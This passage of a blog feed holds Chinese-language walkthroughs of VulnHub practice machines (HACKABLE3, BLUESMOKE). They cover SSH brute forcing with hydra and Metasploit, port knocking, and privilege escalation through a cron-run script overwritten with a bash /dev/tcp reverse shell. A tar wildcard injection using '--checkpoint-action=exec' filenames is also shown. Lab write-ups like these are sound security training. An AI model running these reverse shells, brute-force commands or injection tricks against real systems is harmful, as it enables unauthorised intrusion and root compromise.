&lt;p&gt;目前只能收集到上述一个用户名的信息，密码没有，尝试 hydra 爆破，由于之前采用的是 md5 加密的目录才搜索到的网址，这里对正常的字典扫描了，一遍之后并没有发现，于是猜测用 md5 加密字典对 ssh 密码扫描&lt;/p&gt;
&lt;p&gt;&lt;code&gt;hydra -l freddie -P g3.txt ssh://192.168.31.63 -f -t 32 -I -o hydra.ssh&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 扫描到用户 freddie 的密码是 61a4e3e60c063d1e472dd780f64e6cad&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-885.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;ssh &lt;span class=&#34;exturl&#34; data-url=&#34;bWFpbHRvOmZyZWRkaWVAMTkyLjE2OC4zMS42Mw==&#34;&gt;freddie@192.168.31.63&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-886.png&#34; width=&#34;530&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;上传shellsh到smb&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#上传shellsh到smb&#34;&gt;#&lt;/a&gt; 上传 shell.sh 到 smb&lt;/h3&gt;
&lt;p&gt;看到有一个 445 端口正在执行，445 是 smb 协议&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-887.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;看看共享文件夹中的内容  &lt;code&gt;smbclient -N -L 127.0.0.1&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-888.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;其中带 $ 的是管理员才能进入的目录，发现可直接访问的 grotesque 目录&lt;/p&gt;
&lt;p&gt;连接到共享文件夹中  &lt;code&gt;smbclient \\\\127.0.0.1\\grotesque&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-889.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;没有什么敏感文件，给服务器下载一个 pyps64s 进行监控，看会不会执行 smb 中的文件&lt;/p&gt;
&lt;p&gt;发现每隔一段时间会执行 smb 中的可执行文件，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1zaGVsbC1mZzFoeWp5OHdzc3Iuc2g=&#34;&gt; 准备一个 shell.sh&lt;/span&gt;，尝试上传到 smb 中&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-890.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;将 shell.sh 中的内容复制，粘贴到靶机上边，将靶机上的 shell.sh 中的内容上传到 smb 服务中&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-891.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;监听 shell，等待反弹，pspy 监控到执行，同时得到了 root 的 shell&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-892.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 拿到了 root 的权限&lt;/p&gt;
</content>
        <category term="VULNHUB 31-40" />
        <updated>2021-10-31T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2021/11/01/VULNHUB/135%20HACKABLE3/</id>
        <title>VULNHUB 35 HACKABLE3</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2021/11/01/VULNHUB/135%20HACKABLE3/"/>
        <content type="html">&lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaGFja2FibGUtaWlpLDcyMC8=&#34;&gt;https://www.vulnhub.com/entry/hackable-iii,720/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDEwNzgzNi9hcnRpY2xlL2RldGFpbHMvMTE5NDExNDc1&#34;&gt;https://blog.csdn.net/weixin_44107836/article/details/119411475&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 HACKABLE3：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;识别同一网卡下的 ip 地址，并且过滤出提前已知的 MAC 地址，打印出所 有的机器的 ip 地址并扫描其端口，最后删除多余文件&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l &amp;gt; 1.txt ; cat 1.txt | grep &#39;a0&#39; &amp;gt; 2.txt ; rm -f 1.txt ; cat 2.txt | awk &#39;&amp;#123;print$1&amp;#125;&#39; &amp;gt; ip.txt; rm -f 2.txt; sudo nmap -PA -iL ip.txt;rm -f ip.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-916.png&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.47 靶机开放端口 80 (22 被过滤)&lt;/p&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNDcv&#34;&gt;http://192.168.31.47/&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-917.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看网页源码，提示需要尝试上次日记中使用过的端口碰撞技术来解锁&lt;/p&gt;
&lt;p&gt;ssh 端口，并且告诉老板 approve.jpg，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1oYWNrYWJsZTMtdTc1bjFnd2o4MDBiMjJpOWlhcTM1Y2luMGE1ZzhhLmNvbQ==&#34;&gt;并且有一个公司域名 hackable3.com&lt;/span&gt;，此外还有一个用户名 jubiscleudo。&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-918.png&#34;&gt;
&lt;p&gt;修改本地 hosts 文件，将 hackable3.com 解析到靶机 ip，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1oYWNrYWJsZTMtOXExcnE2MGEuY29t&#34;&gt;打开 hackable3.com&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-919.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;目录扫描  &lt;code&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.47&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-920.png&#34;&gt;
&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2hhY2thYmxlMy5jb20vbG9naW4ucGhw&#34;&gt;http://hackable3.com/login.php&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-921.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2hhY2thYmxlMy5jb20vMy5qcGc=&#34;&gt;http://hackable3.com/3.jpg&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-922.png&#34; width=&#34;600&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;这个 url 地址就很奇怪&lt;/p&gt;
&lt;h3 id=&#34;steghide-图片隐写&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#steghide-图片隐写&#34;&gt;#&lt;/a&gt; Steghide 图片隐写&lt;/h3&gt;
&lt;p&gt;此图片下载下来进行解析一番&lt;br&gt;
 &lt;code&gt;wget [http://hackable3.com/3.jpg -q&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;steghide extract -sf 3.jpg&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;这里使用了文件隐写，Steghide 是一款开源的隐写术软件，它可以让你在一张图片或者音频文件中隐藏你的秘密信息，而且不会注意到图片或音频文件发生了任何的改变。而且，你的秘密文件已经隐藏在了原始图片或音频文件之中了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-923.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;爆出了一个 65535 的端口，猜测是需要端口敲门的一个端口号&lt;/p&gt;
&lt;h3 id=&#34;有效目录筛选&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#有效目录筛选&#34;&gt;#&lt;/a&gt; 有效目录筛选&lt;/h3&gt;
&lt;p&gt;继续访问其他的 url 地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2hhY2thYmxlMy5jb20vMi50eHQ=&#34;&gt;http://hackable3.com/2.txt&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-924.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;找到了 2.txt 这个文件，有 brainfuck 加密的一段密文，用在线网址进行解密&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-925.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现了第二个数字 4444，继续对未搜寻的目标网址进行信息收集&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2hhY2thYmxlMy5jb20vY29uZmlnLzEudHh0&#34;&gt;http://hackable3.com/config/1.txt&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-926.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;找到了 1.txt，直接通过终端进行 base64 解密，找到了第三个数字 10000&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-927.png&#34; width=&#34;310&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2hhY2thYmxlMy5jb20vY29uZmlnLnBocA==&#34;&gt;http://hackable3.com/config.php&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-928.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;找到了一些数据库的配置信息，但是没有利用价值&lt;/p&gt;
&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2hhY2thYmxlMy5jb20vYmFja3VwL3dvcmRsaXN0LnR4dA==&#34;&gt;http://hackable3.com/backup/wordlist.txt&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-929.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;找到一个可能是密码的一个清单&lt;/p&gt;
&lt;p&gt;至此信息收集工作完毕，简单总结一下我们收集到的信息&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2hhY2thYmxlMy5jb20v&#34;&gt;http://hackable3.com/&lt;/span&gt;--&amp;gt; 疑似用户名 jubiscleudo&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2hhY2thYmxlMy5jb20vYmFja3VwL3dvcmRsaXN0LnR4dA==&#34;&gt;http://hackable3.com/backup/wordlist.txt&lt;/span&gt; --&amp;gt; 疑似密码清单&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2hhY2thYmxlMy5jb20vY29uZmlnLzEudHh0&#34;&gt; http://hackable3.com/config/1.txt&lt;/span&gt; --&amp;gt; 10000&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2hhY2thYmxlMy5jb20vY3NzLzIudHh0&#34;&gt;http://hackable3.com/css/2.txt&lt;/span&gt; --&amp;gt; 4444&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2hhY2thYmxlMy5jb20vMy5qcGc=&#34;&gt;http://hackable3.com/3.jpg&lt;/span&gt; --&amp;gt; steghide extract -sf 3.jpg --&amp;gt; 65535&lt;/p&gt;
&lt;h3 id=&#34;shell脚本端口敲门&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#shell脚本端口敲门&#34;&gt;#&lt;/a&gt; shell 脚本端口敲门&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;knockd 服务：即敲门端口服务，该服务通过动态的添加 iptables 规则来隐藏系统开启的服务，使用自定义的一系列序列号来 “敲门”，使系统开启需要访问的服务端口，才能对外访问，不使用时，再使用自定义序列号来 “关门”，将端口关闭，不对外监听。进一步提升了服务和系统的安全性，它的默认配置文件是： &lt;code&gt;/etc/knockd.conf&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;再次检查 22 端口确定是被过滤掉的&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-930.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;尝试用 nmap 依次去访问信息搜集出来的三个端口进行端口敲门&lt;br&gt;
 &lt;code&gt;sudo nmap -p 4444,10000,65535 -A 192.168.31.223&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-931.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 端口敲门失败了，可能是防火墙规则有一定的限制，比如两个端口之间的敲门间隔，两个端口之间的敲门顺序等&lt;/p&gt;
&lt;p&gt;利用 shell 命令进行批量端口敲门&lt;br&gt;
 &lt;code&gt;for i in 10000,4444,65535;do sudo nmap -p $i 192.168.31.48;done&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-932.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;这种方法依次对三个端口进行敲门，不分前后顺序，所以敲门依旧失败了，将逗号去掉，依次对三个端口进行敲门&lt;br&gt;
 &lt;code&gt;for i in 10000 4444 65535;do sudo nmap -p $i 192.168.31.48;done&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-933.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;端口敲门成功后，就可以用字典进行爆破 ssh 协议了&lt;/p&gt;
&lt;h3 id=&#34;hydra或msf-爆破-ssh&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hydra或msf-爆破-ssh&#34;&gt;#&lt;/a&gt; hydra 或 msf 爆破 ssh&lt;/h3&gt;
&lt;p&gt;用户名就用我们信息收集阶段收集到的敏感用户名 jubiscleudo，密码选取在网站上看到的疑似密码的文件&lt;br&gt;
 &lt;code&gt;wget http://hackable3.com/backup/wordlist.txt -O passwd.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-934.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;使用 hydra 尝试 ssh 的爆破&lt;br&gt;
 &lt;code&gt;hydra -l jubiscleudo -P wordlist.txt ssh://192.168.31.48 -t 4 -f -I -vV -o hydra.ssh&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-935.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-936.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 爆破成功，拿到了 jubiscleudo 用户的密码为 onlymy&lt;/p&gt;
&lt;p&gt;也可以用 msfconsole 进行 ssh 的爆破&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;使用 msfconsole 的方法设置参数，如使用 ssh_login 的模块，设置攻击 ip，爆破成功后的行为，线程，日志，密码清单，密码用户等；可以通过 options 选项查看该设置哪些参数&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;msfconsole&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use scanner/ssh/ssh_login&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set rhosts 192.168.31.48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set STOP_ON_SUCCESS yes&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set THREADS 4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set VERBOSE true&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set PASS_FILE /home/parallels/Desktop/tool/hackable3/wordlist.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set USERNAME jubiscleudo&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-937.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;设置好参数之后通过 run 命令开始执行 payload&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-938.png&#34; width=&#34;430&#34; alt=&#34;Image&#34;&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-939.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 爆破成功之后爆出来了用户名和密码 jubiscleudo:onlymy&lt;/p&gt;
&lt;h3 id=&#34;数据库备份文件泄露&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#数据库备份文件泄露&#34;&gt;#&lt;/a&gt; 数据库备份文件泄露&lt;/h3&gt;
&lt;p&gt;登陆服务器  &lt;code&gt;ssh 192.168.31.48 -l jubiscleudo&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-940.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;对服务器的版本，SUID，pkexec，id 组，sudo，cron 检测后没有发现敏感文件，寻找服务器上是否有敏感的遗留文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-941.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在网站主目录下找到一个备份文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-942.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在此文件中看到了数据库的用户名和密码&lt;/p&gt;
&lt;p&gt;-&amp;gt; (‘DB_USERNAME’, ‘hackable_3’);&lt;br&gt;
-&amp;gt; (‘DB_PASSWORD’, ‘TrOLLED_3’);&lt;/p&gt;
&lt;p&gt;mysql 尝试登录此数据库&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-943.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;用 mysql 尝试登陆时却登陆失败了，那么这个用户名的意义何在？&lt;br&gt;
查看一下此系统中存在哪些用户，发现就是有一个 hackable_3 的用户，直接切换到 hackable_3 用户成功&lt;/p&gt;
&lt;h3 id=&#34;定时任务提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#定时任务提权&#34;&gt;#&lt;/a&gt; 定时任务提权&lt;/h3&gt;
&lt;p&gt;看到 id 组属于 lxd，可以 lxd 提权，&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-944.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;这里我们用其他方式提权，给靶机上下载一个 pspy64 s 的监控，看定时任务&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-945.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;靶机上接受到 pspy64s 后，配置可执行权限开始跑程序&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-946.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;有一个 python 脚本定时被执行&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-947.png&#34; width=&#34;600&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;尝试查看次文件时失败了，直接通过 cat 写反弹 shell 的脚本&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; /scripts/to_hackable_3.py &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import os&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;os.system(&amp;quot;bash -c &amp;#x27;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.73/4444 0&amp;gt;&amp;amp;1&amp;#x27; &amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-948.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;监听端口，等待 shell 反弹&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-949.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; py 被执行后，成功拿到 root 权限&lt;/p&gt;
</content>
        <category term="VULNHUB 31-40" />
        <updated>2021-10-31T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2021/11/01/VULNHUB/138%20BLUESOMKE/</id>
        <title>VULNHUB 38 BLUESOMKE</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2021/11/01/VULNHUB/138%20BLUESOMKE/"/>
        <content type="html">&lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvYmx1ZXNtb2tlLWRldnJhbmRvbTIsNjc4Lw==&#34;&gt;https://www.vulnhub.com/entry/bluesmoke-devrandom2,678/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly92aXNoYWwtY2hhbmRhay5tZWRpdW0uY29tL3Z1bG5odWItYmx1ZXNtb2tlLWRldnJhbmRvbTItd3JpdGUtdXAtYTY2OWU3MzgyYmEw&#34;&gt;https://vishal-chandak.medium.com/vulnhub-bluesmoke-devrandom2-write-up-a669e7382ba0&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 BLUESOMKE：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;确定靶机 ip 地址和开放的端口&lt;br&gt;
由已至内网靶机所在主机 MAC 地址自动扫描靶机服务&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l | grep &#39;a0&#39; | awk &#39;&amp;#123;print $1,$2&amp;#125;&#39; | cut -d &#39; &#39; -f 1 | xargs sudo nmap -PA&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1014.png&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip:192.168.31.84 靶机开放端口 22,80&lt;/p&gt;
&lt;h3 id=&#34;tar-通配符提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#tar-通配符提权&#34;&gt;#&lt;/a&gt; tar 通配符提权&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuODQ=&#34;&gt;http://192.168.31.84&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1015.png&#34;&gt;
&lt;p&gt;对方服务器会执行我们上传的 tar 文件，通过上传恶意 tar 文件反弹 shell&lt;/p&gt;
&lt;p&gt;准备反弹 shell 的 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2V4cC5zaA==&#34;&gt;exp.sh&lt;/span&gt; 文件&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; exp.sh &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;! /bin/bash&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash -c &amp;#x27;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.78/4444 0&amp;gt;&amp;amp;1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1016.png&#34; width=&#34;388&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;这里的 ip 我做了别名并且加入到了环境变量里边，对 ifconfig 的结果做了过滤，所以有这么一个奇怪的命令&lt;/p&gt;
&lt;p&gt;tar 通配符提权如下，对方去使用 tar 的时候会执行我们的 exp.sh 从而将 shell 反弹出来&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;&amp;quot; &amp;gt; &amp;quot;--checkpoint-action=exec=sh exp.sh&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;&amp;quot; &amp;gt; --checkpoint=1&lt;/span&gt;&lt;br&gt;&lt;span 